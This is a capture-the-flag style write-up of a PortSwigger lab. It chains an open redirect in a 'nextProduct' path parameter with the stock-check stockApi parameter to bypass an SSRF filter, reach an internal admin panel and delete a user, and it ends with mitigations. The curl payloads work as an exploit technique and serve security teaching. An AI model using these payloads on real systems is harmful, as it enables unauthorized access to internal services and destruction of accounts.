@@ -1,0 +1,263 @@
+---
+title: "SSRF Filter Bypass via Open Redirection"
+description: "How to bypass SSRF filters using an open redirection vulnerability, exploiting a chained attack to access internal admin interfaces."
+labUrl: "https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection"
+category: "SSRF"
+date: "2025-01-01"
+---
+
+## Lab Description (contains spoilers)
+
+This lab demonstrates how to bypass SSRF filters using an open redirection vulnerability.
+
+The application has a stock check feature that loads data from an internal system, URL is filtered to prevent direct SSRF attacks but there's an open redirection vulnerability that can be exploited to bypass these filters.
+
+## Writeup
+
+First let's explore the lab and identify the stock check feature
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/" | cat
+```
+
+> **Command breakdown**: \
+`-s` = silent mode (no progress meter) \
+`| cat` = pipe response output to my [customized cat command](https://github.com/echoesofwhoami/echoes-bat-theme) for stylish display
+
+The main page is displayed on the root path, let's explore it
+
+![Home page](/images/ssrf-filter-bypass-open-redirection/01_home_page.png)
+
+In the main page html we can find the product detail link
+```html
+<SNIP>...<SNIP>
+      <a class="button" href="/product?productId=1">View details</a>
+  </div>
+<SNIP>...<SNIP>
+```
+Lets curl it and see the response.
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product?productId=1" | cat
+```
+
+The product detail page contains the following key elements:
+
+```html
+<SNIP>...<SNIP>
+
+  <form id="stockCheckForm" action="/product/stock" method="POST">
+      <select name="stockApi">
+          <option value="/product/stock/check?productId=1&storeId=1">London</option>
+          <option value="/product/stock/check?productId=1&storeId=2">Paris</option>
+          <option value="/product/stock/check?productId=1&storeId=3">Milan</option>
+      </select>
+      <button type="submit" class="button">Check stock</button>
+  </form>
+  <span id="stockCheckResult"></span>
+  <script src="/resources/js/stockCheckPayload.js"></script>
+  <script src="/resources/js/stockCheck.js"></script>
+  <div class="is-linkback">
+      <a href="/">Return to list</a>
+      <a href="/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>
+  </div>
+
+<SNIP>...<SNIP>
+```
+
+There are a couple of interesting things here:
+
+1. Some javascript code that provides the client-side behavior of this page
+2. The path parameter on this link: ```<a href="/product/nextProduct?currentProductId=1&path=/product?productId=2">| Next product</a>```
+
+Lets explore the javascript code to understand the client-side behavior of this page:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/resources/js/stockCheckPayload.js" | cat
+```
+
+Response:
+
+```javascript
+# stockCheckPayload.js
+window.contentType = 'application/x-www-form-urlencoded';
+
+function payload(data) {
+    return new URLSearchParams(data).toString();
+}
+```
+
+This first JavaScript snippet sets up the content type header and provides a utility function to convert form data into URL-encoded format for the HTTP request.
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/resources/js/stockCheck.js" | cat
+```
+
+Response:
+
+```javascript
+# stockCheck.js
+document.getElementById("stockCheckForm").addEventListener("submit", function(e) {
+    checkStock(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
+    e.preventDefault();
+});
+
+function checkStock(method, path, data) {
+    const retry = (tries) => tries == 0
+        ? null
+        : fetch(
+            path,
+            {
+                method,
+                headers: { 'Content-Type': window.contentType },
+                body: payload(data)
+            }
+          )
+            .then(res => res.status === 200
+                ? res.text().then(t => isNaN(t) ? t : t + " units")
+                : "Could not fetch stock levels!"
+            )
+            .then(res => document.getElementById("stockCheckResult").innerHTML = res)
+            .catch(e => retry(tries - 1));
+
+    retry(3);
+}
+```
+
+This last script is adding an event listener to the submit event of the html form that we've seen earlier (with the id "stockCheckForm"), triggering this event will call the function "checkStock" with the method "POST", the action "product/stock" and the form data as parameters ```checkStock(method, path, data)``` and use the payload function to convert the form data into a x-www-form-urlencoded string as a body for the HTTP request as well as setting the content type header to application/x-www-form-urlencoded.
+
+Let's explore the application behavior more deeply. First, let's emulate the javascript request to check the stock of a product:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/stock/check?productId=1&storeId=1" | cat
+```
+
+> **Command breakdown**: \
+`-H "Content-Type: application/x-www-form-urlencoded"` = set content type header to application/x-www-form-urlencoded to emulate the javascript request \
+`-d "stockApi=/product/stock/check?productId=1&storeId=1"` = set the body of the request to the form data, this will automatically set the http method to POST \
+
+This returns:
+
+```Response: "Missing parameter"```
+
+and made me realize that this endpoint is calling to another one internally and ```&storeId=1``` is not getting added as a parameter to the second request but being parsed in the first one so thats why we get "Missing parameter".
+
+I'll validate my suspicions by sending a GET request directly to ```/product/stock/check?productId=1&storeId=1```
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock/check?productId=1&storeId=1" | cat
+```
+
+```Response: "414 units"```
+
+Now to be absoutely sure about it I will reproduce the same error by not sending the parameter storeId
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock/check?productId=1" | cat
+```
+
+```Response: "Missing parameter"```
+
+So to make it work we have to encode the amperstamp on the first request
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/stock/check?productId=1%26storeId=1" | cat
+```
+
+```Response: "414 units"```
+
+This confirms a SSRF vector, the request is being called from the stockApi parameter.
+
+Now let's try to exploit the SSRF vulnerability directly by attempting to access the internal admin interface:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=http://192.168.0.12:8080/admin" | cat
+```
+
+```Response: `"Invalid external stock check url 'Invalid URL'"```
+
+As expected by the name of this lab, the SSRF is blocked. The application has a filter that validates the `stockApi` parameter and prevents direct access to external URLs, particularly internal network addresses.
+
+Now let's test the open redirection vulnerability we found in the `path` parameter:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/nextProduct?currentProductId=1&path=http://portswigger.net" -v
+```
+
+> **Command breakdown**: \
+`-v` = verbose mode, this will show the response headers
+
+Response: `HTTP/2 302` with `location: http://portswigger.net`
+
+![Product detail page](/images/ssrf-filter-bypass-open-redirection/04_curl_open_redirect.png)
+
+It redirects to portswigger.net, so the open redirect works. The application doesn't validate the `path` parameter and will redirect to any URL we provide. This is the key vulnerability we'll exploit to bypass the SSRF filter.
+
+**Why can't we exploit the path parameter directly for SSRF?**
+
+The `path` parameter is used by the `/product/nextProduct` endpoint, which simply performs an HTTP redirect (302). It doesn't make a server-side request to the URL like the stock check feature does. The SSRF vulnerability is specifically in the stock check functionality where the server makes an HTTP request to the provided URL.
+
+The stock check endpoint (`/product/stock`) is the one vulnerable to SSRF because:
+1. It accepts a `stockApi` parameter
+2. It makes an actual HTTP request to that URL from the server
+3. It returns the response from that request
+
+However, the stock check endpoint has URL filtering that prevents direct access to internal systems.
+
+The open redirect endpoint (`/product/nextProduct`) doesn't have SSRF because:
+1. It only performs a redirect, not a server-side request
+2. The redirect happens on the client-side (browser follows the 302)
+
+**The Exploit Chain**
+
+We need to chain these vulnerabilities:
+1. Use the open redirect to bypass the URL filter in the stock check
+2. The stock check will follow the redirect to the internal admin interface
+3. This gives us indirect SSRF access to internal systems
+
+Let's craft our exploit:
+
+**Note**: In this lab, the target IP `192.168.0.12:8080` and admin panel location are provided in the lab description. In a real-world scenario, you would need to discover this information through internal network enumeration, port scanning, and path discovery techniques.
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin" | cat
+```
+
+This works because:
+1. `stockApi` starts with `/` (allowed - same domain)
+2. The server requests `/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin`
+3. The `nextProduct` endpoint redirects to `http://192.168.0.12:8080/admin`
+4. The stock check follows the redirect and accesses the internal admin interface
+
+Response:
+
+![Product detail page](/images/ssrf-filter-bypass-open-redirection/05_admin_panel.png)
+
+With access to the admin panel, we can delete the user carlos:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos" | cat
+```
+
+Response:
+
+![Product detail page](/images/ssrf-filter-bypass-open-redirection/06_delete_carlos.png)
+
+This last request obliterated the user carlos, solving the lab.
+
+## Mitigation
+
+1. **Validate all redirects**: Ensure redirects only go to allowed, whitelisted domains
+2. **Filter SSRF targets**: Implement strict allowlists for URLs that can be accessed
+3. **Network segmentation**: Separate internal services from external-facing applications
+4. **URL validation**: Properly parse and validate URLs before making requests, specially when performing server-side requests
